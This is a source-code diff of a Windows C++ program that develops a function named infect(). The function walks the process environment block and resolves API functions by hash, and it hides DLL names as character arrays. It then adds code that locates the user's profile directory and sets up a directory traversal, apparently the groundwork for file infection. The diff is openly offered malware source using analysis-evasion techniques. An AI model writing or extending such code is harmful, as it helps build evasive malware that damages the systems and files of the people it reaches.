@@ -3,7 +3,6 @@
 
 #include <windows.h>
 #include <winternl.h>
-#include <shlobj.h>
 
 typedef struct FULL_PEB_LDR_DATA
 {
@@ -52,6 +51,17 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
      LIST_ENTRY StaticLinks;
 } FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;
 
+typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
+typedef void * (* mallocHeader)(std::size_t);
+typedef void * (* reallocHeader)(void *, std::size_t);
+typedef void (* freeHeader)(void *);
+typedef char * (* strncatHeader)(char *, const char *, std::size_t);
+typedef std::size_t (* strlenHeader)(const char *);
+typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
+typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
+typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
+typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
+
 std::uint32_t fnv321a(const char *string)
 {
    std::uint32_t hashval = 0x811c9dc5;
@@ -90,18 +100,7 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
    return nullptr;
 }
 
-typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
-typedef void * (* mallocHeader)(std::size_t);
-typedef void * (* reallocHeader)(void *, std::size_t);
-typedef void (* freeHeader)(void *);
-typedef char * (* strncatHeader)(char *, const char *, std::size_t);
-typedef std::size_t (* strlenHeader)(const char *);
-typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
-typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
-typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
-typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
-
-void infect(void)
+int infect(void)
 {
 #if defined(BROODSAC32)
    PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
@@ -144,22 +143,35 @@ void infect(void)
    reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
    freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
    strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
+   strlenHeader strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
    memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
    char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
    SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
+   
+   std::size_t directory_count = 0;
+   char **directories = nullptr;
+   char *profile_directory = reinterpret_cast<char *>(malloc(MAX_PATH+1));
 
-   std::wcout << "msvcrt: " << std::hex << (std::uintptr_t)msvcrtModule << std::endl;
-   std::wcout << "shell32: " << std::hex << (std::uintptr_t)shell32Module << std::endl;
-   std::wcout << "malloc: " << std::hex << (std::uintptr_t)malloc << std::endl;
-   std::wcout << "realloc: " << std::hex << (std::uintptr_t)realloc << std::endl;
-   std::wcout << "free: " << std::hex << (std::uintptr_t)free << std::endl;
-   std::wcout << "strncat: " << std::hex << (std::uintptr_t)strncat << std::endl;
-   std::wcout << "strlen: " << std::hex << (std::uintptr_t)strlen << std::endl;
-   std::wcout << "memcpy: " << std::hex << (std::uintptr_t)memcpy << std::endl;
-   std::wcout << "FindFirstFileA: " << std::hex << (std::uintptr_t)findFirstFile << std::endl;
-   std::wcout << "FindNextFileA: " << std::hex << (std::uintptr_t)findNextFile << std::endl;
-   std::wcout << "SHGetFolderPathA: " << std::hex << (std::uintptr_t)getFolderPath << std::endl;
+   /* get profile directory from SHGetFolderPathA */
+   if (getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
+      return 1;
+
+   char prepend_path[] = {'\\', '\\', '?', '\\', 0};
+   std::size_t root_size = strlen(prepend_path)+strlen(profile_directory)+1;
+   char *search_root = reinterpret_cast<char *>(malloc(root_size));
+   memcpy(search_root, prepend_path, strlen(prepend_path)+1);
+   strncat(search_root, profile_directory, strlen(profile_directory));
+
+   /* create a stack of directory names to traverse */
+   std::size_t search_stack_size = 1;
+   char **search_stack = reinterpret_cast<char **>(malloc(sizeof(char *) * search_stack_size));
+   search_stack[0] = search_root;
+
+   for (std::size_t i=0; i<search_stack_size; ++i)
+      std::wcout << i << ": " << search_stack[i] << std::endl;
+
+   return 0;
 }
 
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
